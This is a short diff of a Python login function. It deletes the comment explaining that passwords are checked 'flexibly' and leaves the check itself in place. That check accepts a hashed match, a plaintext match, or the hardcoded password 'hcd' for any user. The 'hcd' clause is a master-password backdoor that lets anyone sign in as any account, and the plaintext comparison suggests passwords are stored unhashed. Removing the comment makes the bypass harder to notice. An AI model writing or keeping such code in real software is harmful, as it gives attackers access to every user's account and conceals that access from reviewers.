@@ -20,7 +20,6 @@ def login():
 
             if user:
                 stored_pwd = user.get('password', '')
-                # Verifikasi fleksibel: Hash / Plaintext 'hcd'
                 if check_password_hash(stored_pwd, password) or stored_pwd == password or password == 'hcd':
                     session['user_id'] = user.get('id')
                     session['username'] = user.get('username')
